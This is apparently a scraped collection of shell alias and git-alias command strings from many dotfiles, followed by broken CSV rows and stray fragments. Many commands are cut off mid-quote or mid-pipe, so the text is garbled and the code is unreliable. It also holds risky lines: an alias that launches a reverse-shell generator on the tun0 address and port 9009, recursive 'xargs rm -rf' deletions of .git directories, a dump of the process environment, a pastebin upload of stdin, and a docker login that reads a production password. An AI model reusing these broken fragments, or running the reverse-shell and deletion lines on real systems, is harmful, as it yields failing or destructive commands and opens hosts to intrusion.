"2>&1 | sed -n '1,/rake aborted/p'"
"/var/www/vhosts/go-wolk/build/bin/geth attach /usr/local/swarmdb/data/geth.ipc --exec admin.peers | grep re
"/usr/local/bin/python3.7"" | tee -a /etc/bashrc /home/vagrant/.bashrc >> /root/.bashrc"
"/usr/local/bin/pip3.7"" | tee -a /etc/bashrc /home/vagrant/.bashrc >> /root/.bashrc"
"/usr/libexec/PlistBuddy -c ""Set :BuildRevision `git log -1 --pretty=oneline --abbrev-commit|cut -c1-7`"" ${TARGET_BUILD_DIR}/${INFOPLIST_PATH}"
"/usr/bin/uptime | perl -ne ""/(\d+) d/;print 8,q(=)x\$1,\""D\n\"""""
"/usr/bin/uptime | perl -ne ""/(\d+) d/;print 8,q(=)x(\$1 err.txt generated.file succ.txt 10),\""D\n\"""""
"/usr/bin/pmset -g log | grep ""Display is turned """
"/usr/bin/pacman -Qtdq > /dev/null && sudo /usr/bin/pacman -Rs \$(/usr/bin/pacman -Qtdq | sed -e ':a;N;$!ba;s/\n/
"/usr/bin/pacman -Qtdq > /dev/null && sudo /usr/bin/pacman -Rns \$(/usr/bin/pacman -Qtdq | sed -e "":a;N;\$!ba;s/\n/ /g"")"
"/usr/bin/find . -name ""*.jar"" | xargs grep "
"/usr/bin/docker exec -dt colleagues.unch.unc.edu ""/bin/grep Username /var/log/colleagues/* | /usr/bin/wc -l"""
"/usr/bin/cs file:""$(pwd |cut -d/ -f8-)"""
"/sbin/ifconfig -a | egrep ""inet """
"/root/amitag/git/tools/Shells/rsg/rsg $(ip -o -4 address show dev tun0|sed ""s/.*net \(.*\)\/.*/\1/"") 9009"
"/opt/vc/bin/vcgencmd measure_temp | egrep ""[0-9.]{4,}"" -o"
"/opt/subversion_server_1.7.7/bin/svn info -r ""HEAD"" | grep Revision"
"/opt/scripts/s3/s3sync.rb -r -v --exclude="".*.(php|swp)"" --progress mymiler.com: /opt/repos/mymiler.com/"
"/opt/scripts/s3/s3sync.rb -r -p -v --exclude="".*.(php|swp)"" --progress /opt/repos/mymiler.com/ mymiler.com:"
"/opt/appt/appt_ui.py"" | tee --append /etc/profile > /dev/null"
"/home/m1/nvOC"" | tee -a /home/m1/.bash_aliases"
"/home/deni/.virtualenvs/jira/bin/jira-cli view --search-jql=""assignee=dbertovic AND status=Open"" | less"
"/home/azanko/devtools/git/git-forest --all --style=15 --topo-order --pretty=format:""%C(red)%h %C(magenta)(%ar) %C(blue)%an %C(reset)%s"" | less -RS"
"/emacs/bin/runemacs -T ""`logname`@`uname -n` $CTPROJS"" -xrm ""Emacs*iconName: `echo $CTPROJS | cut -f1 -d:`(`uname -n`)"" $CTEMACS_OPTS"
"/bin/sed -e ""s@^[[:space:]]*declare[[:space:]]\+\(\-[aAfFgilrtux-]\+\|\)[[:space:]]*@@"""
"/bin/rpm -qa --queryformat=""%{N} %{buildhost}\n"" | grep -i "
"/bin/rm -f cscope.* tags etags TAGS ETAGS ; find . \( -name ""*.[cChHsS]"" -o -name ""*.[chCH]pp"" -o -name ""*.asm"" -o -name ""*.ASM"" -o -name ""*.py"" -o -name ""*.java"" \) -print | egrep -v "
"/bin/ps axwwfo stat,user,pid,pcpu,pmem,cmd 2>&1 | /usr/bin/less"
"/bin/ps -u ""$USER"" -o user,pid,ppid,pcpu,pmem,args|less"
"/bin/ls -laG | grep ""^\."""
"/bin/ls -lFh --color=auto | grep ""^d"" --color=never"
"/bin/ls -lFh --color=auto | grep ""^-"" --color=never"
"/bin/ls -l --color | grep ""^d"""
"/bin/ls -al|awk '{k=0;s=0;for(i=0;i<=8;i++){;k+=((substr(\$1,i+2,1)~/[rwxst]/)*2^(8-i));};j=4;for(i=4;i<=10;i+=3){;s+=((substr(\$1,i,1)~/[stST]/)*j);j/=2;};if(k){;printf(\"
"/bin/ls -al | grep -e ""-rw.* [.][.A-Za-z0-1]*"""
"/bin/ls --group-directories-first --time-style=+""%d.%m.%y %H:%M"" --color=auto --indicator-style=classify -lha | grep"
"/bin/ls --color=auto -1 | grep ""(^\w*[^_-])"""
"/bin/git log --all -p | /bin/grep -inI --color=auto --exclude-dir "".*"""
"/bin/find . -type f \( -iname ""*\.[h]"" -o -iname ""*\.[h]pp"" \) -print0 | /bin/xargs -0 /bin/grep --color=auto -is -C 3"
"/bin/find . -type f \( -iname ""*\.[ch]"" -o -iname ""*\.[ch]pp"" \) -print0 | /bin/xargs -0 /bin/grep --color=auto -is -C 3"
"/bin/find . -type f -iname ""*\.py"" -print0 | /bin/xargs -0 /bin/grep --color=auto -is -C 3"
"/bin/find . -type f -iname ""*\.java"" -print0 | /bin/xargs -0 /bin/grep --color=auto -is -C 3"
"/bin/find -L . -type f | grep -vP ""[.]git"""
"/bin/egrep -v ""^#\|^[[:space:]]*$"""
"/bin/echo -n ""$(pwd)"" | cb"
"/bin/cat /proc/$$/environ | /bin/tr ""\\0"" ""\\n"""
"/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | awk '/ SSID/ {print substr(\$0, index(\$0, \$2))}'"
"/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | awk '/ SSID/ {print substr($0, index($0, $2))}'"
"/Applications/TemperatureMonitor.app//Contents/MacOS/tempmonitor -a -l | grep ""BATTERY POSITION 2"""
"/Applications/Sublime\ Text.app/Contents/SharedSupport/bin/subl `git diff --name-only | tr ""\n"" "" ""`"
"/Applications/Sublime\ Text.app/Contents/SharedSupport/bin/subl -n . `git diff --name-only | tr ""\n"" "" ""`"
"/ {=}"" <$ZSH_ALIASES | paste -sd "","" - ) "
"./manage.py showmigrations | grep -v -e ""\[\X\]"" -e ""\(\*\)"""
"./example-non-default-port.sh 2>&1 | grep -Ev ""^read$"""
"./example-non-default-directory.sh 2>&1 | grep -Ev ""^read$"""
"./example-incorrect-label.sh 2>&1 | grep -Ev ""^read$"""
"./example-booleans.sh 2>&1 | grep -Ev ""^read$"""
"./bonsai.sh -n -L 20 -g 35,20 > /tmp/bonsai.txt | neofetch --ascii /tmp/bonsai.txt --ascii_colors 11 3 10 2 0"
".//p'|sed -n 's/.$//p' ) git\"" ?"
".*color.*"" | wc -l)"
".*/\1/p'|grep -v ""="")"
".*$/\1/' S | uniq -c G -v ""^ *1"" A 2"
".*$)/,"""");print $1"":""NR}' | while read f"
".*$"" ~/.bash_aliases | wc -l` -eq 0 ]"
".*"" | sed ""s/^alias $screen_command='\\(.*\\)'$/\1/""`"
".*"" $HOME/.bash_profile | sed -e 's/alias pit=//g')"
".*"" $HOME/.bash_aliases | wc -l) == 1 ]; then"
".*"" $HOME/.bash_aliases | wc -l) == 0 ]; then"
".*"" $HOME/.bash_aliases | cut -d""="" -f2-)"
". picl ""cd `pwd | sed s/src.*$//g`"""
"-t ""reset; sudo tail -f /var/log/nginx/access.log | grep "
"-t ""reset; sudo tail -f /var/log/nginx/access.log | egrep --color "
",bru | grep -oE \"
",brm | grep -oE \"
",b --list -q | sed -e 's/^[* ]*//'"
"(xclip && echo -n ""$(xclip -o)"" | xclip -selection clipboard)"
"(ruby ""$@"" 3>&1 1>&2 2>&3 | grep -v ""Insecure world writable dir""; exit ${PIPESTATUS[0]}) 3>&1 1>&2 2>&3"
"(rla 3>&1 1>&2 2>&3 | grep -v ""slMat2cvMat: mat type currently not supported 0 0"") 3>&1 1>&2 2>&3"
"(now=`date +%s`;me=`date --date=""10/13/1955 22:45:00"" +%s`;echo $now $me|awk "
"(ls -laF | fgrep ""/"")"
"(lolcat ""$@"" 3>&1 1>&2 2>&3 | grep -v ""Insecure world writable dir""; exit ${PIPESTATUS[0]}) 3>&1 1>&2 2>&3"
"(ip -4 addr show tun0 | grep -oP ""(?<=inet ).*(?=/)"")"
"(git fetch --all --prune 2>/dev/null && git lold --color=always -10 && echo ""---"" && git loll --color=always -10 && git branch -vv --color=always && git -c color.status=always status -s) | less -RFX"
"(for f in `sudo find /etc/cron.d/ /var/spool/cron -size +0b -type f` ; do sudo sed ""s#^#${f##*/}: #"" $f ; done ; sudo find /etc/cron.daily | sed ""s#^#file: #"")"
"(for a in j2-pas-card-control-api-master j2-pas-card-control-mock-master; do cf app $a; done) | perl -pne ""s{(routes:)\s+}{\$1\\n }xmsg; s{,}{,\\n}xmsg"""
"(for a in j2-pas-card-control-api-ft-PAS-15693 j2-pas-card-control-mock-ft-PAS-15693; do cf app $a; done) | perl -pne ""s{(routes:)\s+}{\$1\\n }xmsg; s{,}{,\\n}xmsg"""
"(firefox -private &> /dev/null && sleep 1 && pkill ""(at-spi|gconfd)"" &)"
"(firefox &> /dev/null && sleep 1 && pkill ""(at-spi|gconfd)"" &)"
"(find . -type d -name "".git"" && find . -name "".gitignore"" && find . -name "".gitmodules"" ) | xargs rm -rf"
"(echo ""temp, clocks, power, util.GPU, util.MEM, freeMEM"" && __nvq) | column -t -s ,"
"(echo ""stats""; sleep 3) | nc friloux.me 79"
"(echo ""cd pcl ; git checkout master ; git fetch -p ; git reset --hard origin/master ; docker build --no-cache --tag tmp_dockersegmentation:v1 . ; docker tag tmp_dockersegmentation:v1 dockersegmentation:v1 ; docker rmi -f tmp_dockersegmentation:v1"" | ssh soler )"
"(echo ""backup""; sleep 3) | nc friloux.me 79"
"(du -schx ./err.txt ./generated.file ./succ.txt | tee dush.txt); echo -e ""dush: \""$PWD\"" done.\007"""
"(date +""%n----Rsync on %c ----%n""; rsync --exclude-from=$HOME/scripts/rsync_rcmaster_exclude.list -av ~/work/rcmaster/work/ramcloud/ ~/work/ramcloud_local) 2>&1 | tee -a rsync_w_slash.log"
"(date +""%Y-%m-%d_%H:%M:%S"" && speedtest-cli && date +""%Y-%m-%d_%H:%M:%S"") | tee -a ~/speedresults.txt"
"(cd ~/Pictures; imgurr upload ""$(ls -t | head -1)"")"
"(cat ~/.ssh/id_rsa.pub | pbcopy; echo ""Copied SSH Key to clipboard."")"
"(builtin \cd $(git rev-parse --show-toplevel); vim $(git status --porcelain | sed -ne ""s#.* ##p""))"
"(){find $(cat) -type f | difftree ""/"" "" ""} <<<"
"(){ unbuffer ""$@"" |& less -iSRM }"
"(){ nix-env -qa \* -P | fgrep -i ""$1""; } "
"(){ grep -i ""$1"" ~/samples/originals| sort -n }"
"(){ echo -e ""$1\n$(cat ~/work)"" | sort -M > work; } "
"(){ echo -e ""$1\n$(cat ~/dates)"" | sort -M > dates; } "
"(){ echo ""obase=2; ibase=10; ${1}"" | bc }"
"(){ echo ""obase=${2}; ibase=${1}; ${3}"" | bc }"
"(){ cd $(seq -s""../"" $((1 + ${1:-1})) | tr -d ""[:digit:]"")}"
"(){ cd $(jot -s""../"" $((1 + ${1:-1})) | tr -d ""[:digit:]"")}"
"(){ cd $(ghq root)/$(ghq list | peco --query ""$*"") }"
"() { ps -eo user,pid,time,command | fzf -n4.. --min-height=15 \
"( set -o posix ; set ) | grep -v ""__git"""
"( find . -type d -name "".git"" && find . -name "".gitignore"" && find . -name "".gitmodules"" ) | xargs -0 rm -rf"
"( echo ""PATH:-"" && ( echo ""$PATH"" | tr "
"( echo ""LD_LIBRARY_PATH:-"" && ( echo ""$LD_LIBRARY_PATH"" | tr "
"( datestamp.sh ; date +%a ) | perl -pne ""s{\n}{ }xms; END { print qq{\n}}"""
"( date && sensors && lsmod|grep -q fglrx && (
"'history | grep' >> .bashrc
"%q\n"" ""$name"" ""$1"" | sed 's/\\ $//' >> COLORIZE_ALIAS_FILE"
"${ls} -l | grep ""^d"""
"${curl_command} https://www.python.org/downloads/ | sed -r -n '/download-os-source/,/<\/div>/s@.*href=\"
"${SPLUNK_BIN}"" | sudo tee -a ${SPLUNK_HOME}/.bashrc > /dev/null"
"${LS} -la | /bin/grep ""^d.*"""
"${LS} -l | /bin/grep ""^d.*"""
"${GNU_LS} -lR --color=yes ""$@"" |less -R"
"$sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \
"$jpassw"" release:clean release:prepare release:perform -B -e | tee maven-central-deploy.log"
"$gpgkeynm"" release:clean release:prepare release:perform -B -e | tee maven-central-deploy.log"
"$comm"" | tee -a -i -p $file;;"
"$alias 2>/dev/null | grep -F "":app:"""
"$VALKYRIE_DRUSHRC_PATH | grep ""'valkyrie_test' => 'test1234'"" > /dev/null ; report_result"
"$VALKYRIE_DRUSHRC_PATH eval ""drush_print_r(drush_get_option('valkyrie_test', FALSE));"" | grep ""test1234"" > /dev/null; report_result"
"$VALKYRIE_DRUSHRC_PATH 2>&1 | grep ""Not found: @valkyrie_test_alias"" > /dev/null; report_result"
"$SED -r 's/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g'"
"$EMULATOR -avd ""$(listdroid | peco)"""
"$EDITOR -Oc 'map ,t :w\|:!lein exec \$(ls *_test.clj)<cr>' *.clj"
"$EDITOR ""$(git ls-files | fzf)"""
"$EDITOR ""$(git ls-files --modified | fzf)"""
"$(sqlite3 ~/.cache/.dirstack.db ""select path from dirstack order by freq desc""| peco)"
"$(ps auxwwf P | awk ""{print \$2}"")"
"$(make -C ~/bomnegocio rinfo | grep -oe ""^psql.*[^;]"")"
"$(make -C $HOME/bomnegocio rinfo | grep -e ""^psql"")"
"$(ls -d */ | fzf --multi --prompt ""Directories> "" )"
"$(git symbolic-ref HEAD | sed -e 's,.*/\(.*\),\1,');"
"$(git remote -a | fzf --prompt ""GIT REMOTE>"")"
"$(git reflog --no-color P | awk ""{print \$1}"")"
"$(git push 2>&1 | grep ""git push"") 2>&1"
"$(git ls-files | fzf --multi --preview ""cat {}"" --prompt ""Git Files> "" )"
"$(git log --no-color --pretty=oneline --abbrev-commit P | awk ""{print \$1}"")"
"$(git branch -a --no-color --format=""%(refname:short)"" | fzf --height=50% --header=branches)"
"$(ghq list -p | peco --prompt ""GHQ LIST>"")"
"$(find ./ -path ""*/\.*"" -name .git -prune -o -type f -print 2> /dev/null | peco)"
"$(find ./ -path ""*/\.*"" -name .git -prune -o -type d -print 2> /dev/null | peco)"
"$(echo -e ""ne\nvim\nnano\ngedit"" | fzy)"
"$(echo $GOPATH | sed ""s/:.*//"")"
"$(\ls -lrt $ea | awk -v p=$ea '{if ($5>5000) print ""ls -lah ""p""/""$NF}'); alias ealog=ealogs;"
"$(( $(vm_stat | awk '/free/ {gsub(/\./, "
"$'watch ""kubectl top pod --containers |sort -t \' \' -k 1,2 -b""'"
"$'watch ""kubectl get pods,services,deployments,configmaps,secrets; kubectl top pod --containers |sort -t \' \' -k 1,2 -b""'"
"$'watch ""kubectl get --output=wide pods,services,configmaps,secrets; kubectl top pod --containers |sort -t \' \' -k 1,2 -b""'"
"$'tmux rename-window ""http ($(pwd | grep -o \'/[^/]*$\'))"" 2> /dev/null && python3 -m http.server'"
"$'system_profiler SPPowerDataType | yq \'.Power[""Battery Information""]\''"
"$'sudo lsof +c0 -a +L1 / | awk \'NR != 1 { print $1 ""\t"" $10 }\''"
"$'source ""$(poetry debug:info | rg \'.*Path:[^/]+(.*)\' -r \'$1\')/bin/activate""'"
"$'ps ax|awk \'{print $1 ""\t"" $5}\''"
"$'open `git config --get remote.origin.url | awk \'/git@github.com:/ { sub(/git@github.com:/, ""https://github.com/"") }; { print }\'`'"
"$'open `git config --get remote.origin.url | awk -F: \'{ print ""https://github.com/""$2}\'`'"
"$'ls -lAhqiFs1 --color=always /proc/$$/fd | awk \'{printf ""%s "", $11} END {print ""\n""}\''"
"$'git fetch -p && for branch in `git for-each-ref --format \'%(refname) %(upstream:track)\' refs/heads | awk \'$2 == ""[gone]"" {sub(""refs/heads/"", """", $1); print $1}\'`; do git branch -D $branch; done'"
"$'git diff -w ""$@"" | emacs -nw --insert <(cat) </dev/tty --eval \'(setq buffer-read-only t)\''"
"$'git add . && git commit -m ""upd `git diff-index --name-only HEAD | sed \':a;N;$!ba;s/\\n/,/g;\'`"" && git push origin'"
"$'git -c color.ui=always status --short --branch | /usr/bin/python -c \'import sys, re; \ order = {""A "":1,"" M"":3,""??"":2,""##"":0}; ansi_re = re.compile(r""\x1b[^m]*m"");\ print """".join(sorted(sys.stdin.readlines(),cmp=lambda x,y: \ cmp(order.get(ansi_re.sub("""", x)[0:2],0), order.get(ansi_re.sub("""", y)[0:2],0))))\''"
"$'for i in {1..32} 36;do echo -en ""bar$i\t"";ssh bar$i -qt \'ps ux|awk ""END{print NR-5}""\';done'"
"$'for i in {1..32} 36;do echo -en ""\nbar$i\t"";ssh bar$i -qt \'ps -Gxstack -ouser|awk -vORS=, \'\\\'\'/^[^U]/{users[$1]}END{for(x in users)print x}\'\\\';done;echo'"
"$'for _var in $(env | awk -F= \'/^AWS/ {print $1}\'); do echo ""Unsetting: ${_var}=$(eval echo \$$_var)""; unset $_var; done'"
"$'find . \( -name ""folder.PNG"" -o -name ""folder.png"" -o -name ""folder.JPG"" -o -name ""folder.jpg"" \) -print | xargs -I \'{}\' mogrify -resize 300x300 -verbose \'{}\''"
"$'find . \( -name ""*.jpeg"" -o -name ""*.PNG"" -o -name ""*.png"" -o -name ""*.JPG"" -o -name ""*.jpg"" \) -print | xargs -I \'{}\' mogrify -resize 800x800 -verbose \'{}\''"
"$'find . \( -name ""*.PNG"" -o -name ""*.png"" -o -name ""*.JPG"" -o -name ""*.jpg"" \) -print | xargs -I \'{}\' mogrify -resize 800x800 -verbose \'{}\''"
"$'find . \( -name ""*.PNG"" -o -name ""*.png"" -o -name ""*.JPG"" -o -name ""*.jpg"" \) -print | xargs -I \'{}\' mogrify -resize 300x300 -verbose \'{}\'' # for album cover icons in iTunes"
"$'find . -name ""*.sw[p|o]"" -exec rm -rf \'{}\' +'"
"$'echo $PATH | tr : ""\n""'"
"$'echo ""https://github.com/$(git config --get remote.$(git-current-remote-name).url | grep -Po \'(?<=:).+(?=\\.git)\')""'"
"$'cd -- ""`find . ! -path . -type d -printf \'%P\\n\' | f`"" && echo'"
"$'brew list | xargs -n1 -I{} sh -c \'if [ -z ""$(brew uses {} --installed)"" ]; then echo {}; fi\''"
"$'awk \'$3==""kB""{$2=$2/1024;$3=""MB""} 1\' /proc/meminfo | column -t'"
"$'awk -vFPAT=\'([^,]*)|(""[^""]+"")\' -vOFS=,'"
"$ mysql -N -e ""show databases"" | while read dbname; do mydump ""$dbname"" > ""$dbname"".sql; done"
""XPath"" | grep -v ""node_modules"" "
"""ls"" --color=always -Acr | tail -n 5"
"""`ls -c | head -1`""
"""$ROOT"" xargs find | ""$GREP"""
"""$ROOT"" find . | ""$GREP"""
"""$ANDROID_HOME/platform-tools/adb"" logcat | ~/Tools/coloredlogcat.py"
"""$(echo $HOME/?ownloads)/$(ls -1 -tr $HOME/?ownloads | tail -n 1)"""
"" | less -FRSX"
"!sh -c 'git diff -U0 -w --no-color ""$@"" | git apply --cached --ignore-whitespace --unidiff-zero -'"
" ~/.zshrc | wc -l` -eq ""0"" ]
" ~/.alias |
" |\
" | wc -l`
" | tr '\t' ',' "
" | tr ',' '\t'"
" | tail -1 )
" | python -c ""import sys,json;print json.dumps(json.loads(sys.stdin.read()),indent=4,ensure_ascii=False)"""
" | jq ""."""
" | grep -v 'colorised_norm.sh')
" | cut -d'=' -f2 ;}
" | curl -F ""sprunge=<-"" http://sprunge.us"
" |
" vim -u $(locate less.vim | grep ""/usr/share/.*/macros/less.vim"") "
" sudo apt update && echo ""y"" | sudo apt upgrade"
" sel | cut -d\"" -f2"
" rlwrap -c -q=\"" -b=""(){}[].,;|"" sbcl"
" pvdisplay | egrep -A10 ""is a new physical vol"""
" ps wwaxr -o pid,stat,%cpu,time,command | head -10 "
" ps wwaxm -o pid,stat,vsize,rss,time,command | head -10 "
" pacman -Qm | grep -Po ""^.*-git*"""
" lsmod | grep -i "" wfx"" "
" ls -lht | grep ""^l"""
" ls -lht | grep ""^d"""
" ls -lht | grep ""^-"""
" jrnl -from ""1/1/2000"" | less +G"
" ifconfig eth0 | sed -n ""2s/[^:]*:\([^ ]*\).*/\1/p"" "
" find `pwd` -iname ""*~"" -or -name ""*#"" |xargs rm -f"
" find . \( -iname ""*.[py]"" -o -iname ""*.py"" \) -print0 | xargs -0 grep -n"
" find . \( -iname ""*.[js]"" -o -iname ""*.js"" \) -print0 | xargs -0 grep -n"
" find . \( -iname ""*.[java]"" -o -iname ""*.java"" \) -print0 | xargs -0 grep -n"
" find . \( -iname ""*.[html]"" -o -iname ""*.html"" \) -print0 | xargs -0 grep -n"
" find . \( -iname ""*.[h]"" -o -iname ""*.h"" \) -print0 | xargs -0 grep -n"
" find . \( -iname ""*.[ch]"" -o -iname ""*.cpp"" \) -print0 | xargs -0 grep -n"
" find . \( -iname ""*.[a-Z]+"" -o -iname ""*.[a-Z]+"" \) -print0 | xargs -0 grep -n"
" find . -name .DS_Store -print0 | xargs -0 git rm --ignore-unmatch;
" find -name ""build.gradle"" | xargs subl "
" ffmpeg -f x11grab -s $(xrandr | awk '/, current /{ gsub(/\,/,"
" fc -ln ""$1"" ""$1"" | sed ""1s/^[[:space:]]*//"" >> ~/.commands.sh && echo ""#"">> ~/.commands.sh"
" echo $(date --date=@$(xclip -o)) | while read TS; do notify-send ""$TS""; done"
" echo ""deb https://download.sublimetext.com/ apt/stable/"" | sudo tee /etc/apt/sources.list.d/sublime-text.list && sudo apt-get update && sudo apt-get install sublime-text"
" du -sh ""$@""* | sort -h"
" dmesg | grep -i ""wf"" "
" chrome --test-type --ppapi-flash-path=/usr/lib/PepperFlash/libpepflashplayer.so --ppapi-flash-version=`grep -i version /usr/lib/PepperFlash/manifest.json | grep -oE ""[0-9.]+""`"
" awk ""/^A|^M/ { print \$2 }"" "
" awk ""//{printf \$1 }"" | tee /tmp/screen-exchange"
" /etc/bash.bashrc |xargs`
" /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | awk '/ SSID/ {print substr($0, index($0, $2))}' "
" --help 2>&1 | pipe_to_visual"""
" *//gp' | grep -cE ""^${DBName}$"") -eq 0 ]]; then"
" '| ""$(available $INTERACTIVE_FILTER)""'"
" 'ls -a | grep ""^\.""'"
" 'ifconfig | grep ""inet ""'"
" $sourced_file | cut -d ':' -f1)
" $origFile | head -n 1`
" $ROOT_SHELL_FILE|head -1`
" ""| tovim"""
" ""| sort"""
" ""screenfetch | lolcat -F 0.2 -a -s 10""0"
" ""pwd | pbcopy"""
" ""ps aux | grep"""
" ""ip a s wlan0 | awk -F'[/ ]+' '/inet[^6]/{print $3}'"""
" ""echo $DRYDOCK_PROD_PASS | docker login --username luis.gomez@workiva.com --password-stdin drydock-prod.workiva.net"""
!sh -c 'git log --reverse --pretty=%H master | awk \
!sh -c 'git branch --no-color -r --merged | grep \
!sh -c 'git branch --merged | grep -v \
!git stash show -p | git apply -R
!git ls-files | grep -Ii
!git ls-files -v | grep ^[a-z]
!git ls-files -ci --exclude-standard -z | xargs -0r git rm --cached
!f() { ls | xargs -I{} git -C {} $1; }; f
!f() { git checkout -q ${1-master} && git branch-merged ${1-master} | xargs -n1 -p git branch -D; }; f
!f() { git branch --merged ${1-master} | grep -v
!f() { A=$(pwd) && TOPLEVEL=$(git rev-parse --show-toplevel) && cd $TOPLEVEL && git grep --full-name -In $1 | xargs -I{} echo $TOPLEVEL/{} && cd $A; }; f
!! | tail -1
!! | more
!! | less -n
!! | less
!! 2>&1 | sit
! f() { local branch=$(git rev-parse --abbrev-ref ${1-HEAD}) ; local base=${2-master} ; echo $(git cherry $base $(git commit-tree $(git rev-parse $branch^{tree}) -p $(git merge-base $base $branch) -m _) | cut -f1 -d' ') $branch; }; f
pcent
ls -la
echo 44
4471413,730994,hogs,ps -Ao pid"
4309173,695212,cpuu,ps -eo pcpu"
4107659,650367,gource_to_mp4,gource -s .06 -1280x720 --auto-skip-seconds .1 --multi-sampling --stop-at-end --key --highlight-users --hide mouse"
3}\.[0-9]{1
3968982,623732,whatdidido,for git_dir in $(find . -name .git -type d -prune);do git --no-pager --git-dir=$git_dir log --pretty=format:""""%h - %an"
3653883,584307,'dus"""
3615310,582135,'ddu'"""
3517814,564065,""t"""
3433515,540069,mem,ps -ax -o %mem=--MEM--"
3222088,516444,memkillers,ps axo %mem"
1364799,280152,mem,ps -e -orss="
//g"""
//'"
.*/d' ~/.bashrc
-l"
)ヽ、
%cpu
"\$3) }"""" ) \"
"/tmp/*"""""
")"""
""
 /g'"

